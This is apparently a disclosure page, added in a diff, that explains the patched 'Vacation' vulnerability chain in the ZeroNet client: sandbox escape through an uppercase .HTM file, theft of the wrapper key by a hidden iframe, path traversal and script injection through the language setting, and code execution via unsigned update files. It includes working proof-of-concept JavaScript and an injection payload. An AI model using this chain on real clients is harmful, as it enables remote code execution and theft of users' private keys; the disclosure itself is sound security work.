@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>The Vacation</title>
+		<meta charset="utf-8">
+		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+		<base href="" target="_top" id="base">
+		<script>base.href = document.location.href.replace("/media", "").replace("index.html", "").replace(/[&?]wrapper=False/, "").replace(/[&?]wrapper_nonce=[A-Za-z0-9]+/, "")</script>
+
+		<link rel="stylesheet" type="text/css" href="index.css">
+	</head>
+	<body>
+		<header>
+			<h1>The Vacation</h1>
+			<h2>Vurnerability list</h2>
+		</header>
+
+		<article>
+			<h2>Vuln details</h2>
+
+			<summary>
+				<b>Type:</b> Remote Code Execution<br>
+				<b>Affected clients:</b> all<br>
+				<b>PoC:</b> <a href="patch/">click</a>
+			</summary>
+
+			<p>
+				On September 27th, 2018 suspected exploitation of a series of
+				vulnerabilities was found on a public ZeroNet proxy. The timing
+				couldn't have been worse as nofish, ZeroNet's main developer,
+				was currently on vacation. Affectionately named "The Vacation
+				Vulnerability", a group of ZeroNet website developers set out to
+				understand what happened and develop a patch for ZeroNet that
+				could prevent the same happening to other users. A few days
+				later, once the patch was near completion, nofish returned and
+				began collaborating with the developers on a solution and a
+				disclosure. After some tweaking, the patch was released, but
+				full details were held back until a majority of clients
+				had updated to protect themselves.
+			</p>
+
+			<p>
+				Now that many people have updated, the vulnerability details are
+				released below in full. Credit goes to GitCenter for
+				vulnerability discovery and the website you're currently
+				reading.
+			</p>
+		</article>
+
+		<article>
+			<h3>#1</h3>
+
+			<summary>
+				HTML/HTM extension is checked in lower case, so using filename
+				like <code>index.HTM</code> would result in escaping iframe.
+			</summary>
+
+			<p>
+				There are a few places where <code>.htm</code> or
+				<code>.html</code> extension is checked &mdash; however, they
+				are checked either with <code>str.endswith()</code> or
+				<code>str.split(".")[-1] == ...</code>. For example:
+			</p>
+			<pre data-filename="src/Ui/UiRequest.py">
+# Render a file from media with iframe site wrapper
+def actionWrapper(self, path, extra_headers=None):
+    if not extra_headers:
+        extra_headers = {}
+
+    match = re.match("/(?P&lt;address&gt;[A-Za-z0-9\._-]+)(?P&lt;inner_path&gt;/.*|$)", path)
+    if match:
+        address = match.group("address")
+        inner_path = match.group("inner_path").lstrip("/")
+        if "." in inner_path and not inner_path.endswith(".html") and not inner_path.endswith(".htm"):
+            return self.actionSiteMedia("/media" + path)  # Only serve html files with frame
+</pre>
+			<p>
+				This leads to a way to disable wrapper without using
+				<i>NOSANDBOX</i> permission, which would, of course, shock the
+				user &mdash; it's description is:
+			</p>
+			<blockquote>
+				Modify your client's configuration and access all site
+				<i>(sic)</i>
+			</blockquote>
+			<p>
+				By the way, looks like there is no way to use
+				<code>index.htm</code> or <code>main.html</code> or any other
+				page instead of <code>index.html</code>. I'm quote sure that
+				the lack of this Apache's feature will make it harder to switch
+				sites to use ZeroNet.
+			</p>
+		</article>
+
+		<article>
+			<h3>#2</h3>
+
+			<summary>
+				Wrapper can be embed to <code>&lt;iframe&gt;</code>.
+			</summary>
+
+			<p>
+				Let's try to add the following code to <code>index.html</code>:
+			</p>
+			<pre data-filename="index.html">
+&lt;iframe src="/"&gt;&lt;/iframe&gt;
+</pre>
+			<p>
+				This code opens wrapper (which renders ZeroHello) in iframe.
+				However, it doesn't work. If you open Chrome console, you'll
+				notice this:
+			</p>
+			<blockquote>
+				Refused to display
+				'http://127.0.0.1:43110/1HeLLo4uzjaLetFx6NH3PMwFP3qbRbTf3D' in a
+				frame because it set 'X-Frame-Options' to 'sameorigin'.
+			</blockquote>
+			<p>
+				Oops. Moreover, if we try to use
+				<code>iframe.contentWindow</code>, it simply won't work: because
+				of <code>sandbox</code> attribute on the iframe containing our
+				<code>index.html</code>.
+			</p>
+			<p>
+				However, there is a solution. We have <b>#1</b>, so
+				<code>sandbox</code> is not a problem now. Using
+				code from <code>index.html</code> is not a good idea, because
+				we'll be immediately redirected to ZeroHello, however, we can
+				add <code>sandbox</code> attribute ourselves:
+			</p>
+			<pre data-filename="index.HTM">
+&lt;iframe src="/" sandbox="allow-same-origin"&gt;&lt;/iframe&gt;
+</pre>
+			<p>
+				Easy-peasy. Add some styles like <code>opacity: 0</code> and
+				it's ready. Moreover, no scripts will be executed, so
+				<code>&lt;script&gt;</code> tag that contains
+				<code>wrapper_key</code> won't be removed.
+			</p>
+			<pre data-filename="get_wrapper_key.js">
+function createIframe() {
+    let iframe = document.createElement("iframe");
+
+    // Hide iframe
+    iframe.width = 0;
+    iframe.height = 0;
+    iframe.border = 0;
+    iframe.style.width = "0px";
+    iframe.style.height = "0px";
+    iframe.style.border = "none";
+    iframe.style.opacity = "0";
+    iframe.style.fontSize = "0"; // just in case
+    iframe.style.position = "fixed";
+    iframe.style.left = "-1000px";
+
+    // Set sandbox
+    iframe.sandbox = "allow-same-origin";
+
+    document.body.appendChild(iframe);
+
+    return iframe;
+}
+
+// First, we create an empty iframe
+let iframe = createIframe();
+
+// Load wrapper
+iframe.onload = wrapperLoaded;
+iframe.src = "index.html";
+
+let ws;
+function wrapperLoaded() {
+    iframe.onload = null;
+
+    // Find script
+    let initScript = iframe.contentDocument.getElementById("script_init");
+
+    // Get code
+    let code = initScript.value || initScript.innerHTML || initScript.innerText || initScript.textContent;
+
+    // Find wrapper_key
+    let wrapperKey = (
+        code.split("wrapper_key")[1].split("ajax_key")[0]
+        .replace(/[^A-Za-z0-9]/g, "")
+    );
+
+    console.log("Wrapper key is:", wrapperKey);
+}
+</pre>
+			<p>
+				When we have wrapper key, we can connect to websocket that
+				ZeroNet wrapper uses:
+			</p>
+			<pre data-filename="ZeroWebSocket.js">
+class ZeroWebsocket {
+    constructor(url) {
+        this.url = url;
+        this.next_message_id = 10000000;
+        this.waiting_cb = {};
+    }
+
+    connect(isReconnect) {
+        this.connected = false;
+        this.message_queue = [];
+        this.isReconnect = isReconnect;
+        this.ws = new WebSocket(this.url);
+        this.ws.onmessage = this.onMessage.bind(this);
+        this.ws.onopen = this.onOpenWebsocket.bind(this);
+        this.ws.onclose = this.onCloseWebsocket.bind(this);
+    }
+
+    onMessage(e) {
+        let message = JSON.parse(e.data);
+        let cmd = message.cmd;
+        if(cmd == "response") {
+            if(this.waiting_cb[message.to]) {
+                this.waiting_cb[message.to](message.result);
+            }
+        } else if(cmd == "ping") {
+            this.response(message.id, "pong");
+        }
+    }
+
+    response(to, result) {
+        this.send({cmd: "response", to: to, result: result});
+    }
+
+    cmd(cmd, params={}, cb=null) {
+        this.send({cmd: cmd, params: params}, cb);
+    }
+
+
+    send(message, cb=null) {
+        if(!message.id) {
+            message.id = this.next_message_id++;
+        }
+        if(this.connected) {
+            this.ws.send(JSON.stringify(message));
+        } else {
+            this.message_queue.push(message);
+        }
+        if(cb) {
+            this.waiting_cb[message.id] = cb;
+        }
+    }
+
+    onOpenWebsocket(e) {
+        this.connected = true;
+
+        if(this.isReconnect) {
+            if(this.onReconnect) {
+                this.onReconnect();
+            }
+        }
+
+        // Process messages sent before websocket opened
+        for(let message of this.message_queue) {
+            this.ws.send(JSON.stringify(message));
+        }
+        this.message_queue = [];
+    }
+
+    onCloseWebsocket(e, reconnect=10000) {
+        this.connected = false;
+        if(!e || e.code != 1000 || !e.wasClean) {
+            // Connection error
+            setTimeout(() => {
+                this.connect(true);
+            }, reconnect);
+        }
+    }
+}
+
+window.ZeroWebsocket = ZeroWebsocket;
+</pre>
+			<pre data-filename="websocket.js">
+function connectToWebSocket(wrapperKey) {
+    let proto = location.protocol.replace("http", "ws");
+    let ws = new ZeroWebsocket(
+        `${proto}//${location.host}/Websocket?wrapper_key=${wrapperKey}`
+    );
+    ws.connect();
+    return ws;
+}
+
+let ZeroFrame = connectToWebSocket();
+ZeroFrame.cmd("siteInfo", [], console.log.bind(console));
+</pre>
+		</article>
+
+		<article>
+			<h3>#3</h3>
+
+			<summary>
+				Language can contain <code>..</code>, which results in reading
+				JSON file outside current site or <code>plugins/</code>
+				directory.
+			</summary>
+
+			<p>
+				This vurnerability was not used in The Vacation attack, and I
+				can hardly imagine how it can be used, but it's a
+				vurner<i>ability</i> &mdash; so I report it as well.
+			</p>
+			<p>
+				ZeroFrame API has a command called <code>configSet</code>. You
+				pass it <code>key</code> and <code>value</code> and, if the key
+				is <code>tor</code>, <code>language</code>,
+				<code>tor_use_bridges</code> or <code>trackers_proxy</code>, it
+				saves it to <code>zeronet.conf</code>.
+			</p>
+			<p>
+				So, here comes the idea. We can call <code>configSet</code>
+				(it's admin command, but we have admin right because we are
+				directly connected to WebSocket) with <code>language</code> key
+				and pass it some path. ZeroNet would join
+				<code>languages/</code>, your string and <code>.json</code>.
+				It may look like if you pass <code>../../users</code>, it would
+				point to <code>users.json</code>. You're right, but looks like
+				there is no way to read that file somehow. When site data is
+				translated, language name is checked against <code>..</code>.
+				When plugin text is translated (e.g.: <i>Connected</i> and
+				<i>Delete</i> in sidebar), file path is not checked, however, we
+				can't change sidebar text &mdash; so it doesn't help at all.
+			</p>
+		</article>
+
+		<article>
+			<h3>#4</h3>
+
+			<summary>
+				Language can contain <code>"</code> and <code>&lt;</code>.
+			</summary>
+
+			<p>
+				This vurnerability was not used in The Vacation as well,
+				however, it may simplify stealing mail or something like that.
+			</p>
+			<p>
+				Most sites made by @nofish (e.g.: ZeroHello, ZeroMail, ZeroMe,
+				etc.) use <code>&lt;script src="...?lang={lang}"&gt;</code> to
+				include JS files. It's a pity no one else uses it, because it's
+				a useful feature. Originally, to avoid caching the wrong
+				language. Pretend you choose English language in ZeroHello, and
+				then switch to Chinese. English version would be cached, and
+				you'd have to wait for cache to expire to download the new,
+				Chinese version.
+			</p>
+			<p>
+				Using ADMIN permission we had from <b>#2</b> and using
+				<code>configSet</code> like we used it in <b>#3</b>, we can
+				change <code>language</code> to
+				<code>"&gt;&lt;/script&gt;YOURCODE&lt;script data-a="</code> and
+				embed our HTML code (or JS code, if we add <code>script</code>
+				tag) to other sites.
+			</p>
+		</article>
+
+		<article>
+			<h3>#5</h3>
+
+			<summary>
+				ZeroUpdate code is not signed.
+			</summary>
+
+			<p>
+				It's time to remember that ADMIN permission gives us access to
+				all sites. What about such site as... ZeroUpdate?
+			</p>
+			<blockquote>
+				New way to receive updates (currently optional): Simply visit
+				site
+				<a href="/1UPDatEDxnvHDo7TXvq6AEBARfNkyfxsp">
+					1UPDatEDxnvHDo7TXvq6AEBARfNkyfxsp
+				</a>
+				to receive updates via the ZeroNet network. Next time when you
+				push the update button of your client, then it will use this
+				site to update your client to the latest version. This way you
+				don't have to trust SSL Certificate providers/source-code
+				hosting companies, because everything is cryptographically
+				signed. It's also delivers the updates to countries where github
+				is not accessible.
+				<a href="/Blog.ZeroNetwork.bit/?Post:98">ZeroBlog</a>
+			</blockquote>
+			<p>
+				"Cryptographically signed". Yeah. But what exactly is signed?
+				File transactions between peers. Not files themselves. So if
+				someone gives you a file with wrong content, you'll notice it --
+				the signature doesn't match the one inside
+				<code>content.json</code>, which is cryptographically signed.
+				But you'll never notice that a signature doesn't match if you
+				change the file yourself.
+			</p>
+			<p>
+				This leads to a way to run Python code on your machine. Simply
+				change some file in <code>ZeroNet</code> folder of ZeroUpdate,
+				and ask the user to update. Or even don't ask: call
+				<code>serverUpdate</code> yourself. The user won't even notice
+				the error message:
+			</p>
+			<blockquote>
+				Connection with UiServer Websocket was lost. Reconnecting...
+			</blockquote>
+			<p>
+				...because it is drawn by the wrapper &mdash; and we've disabled
+				it.
+			</p>
+			<p>
+				So what can we do? We can change some rarely used file, e.g.
+				from a library, such as <code>PySocks</code> &mdash; or even an
+				executable, like <code>tor.exe</code>. Our script (or
+				executable) would steal private keys for your sites from
+				<code>users.json</code>. It would steal private keys for your
+				<i>ZeroID</i>, <i>KaffieID</i> and <i>PeakID</i> accounts. It
+				would steal encryption keys for your <i>ZeroMail</i>.
+			</p>
+		</article>
+	</body>
+</html>
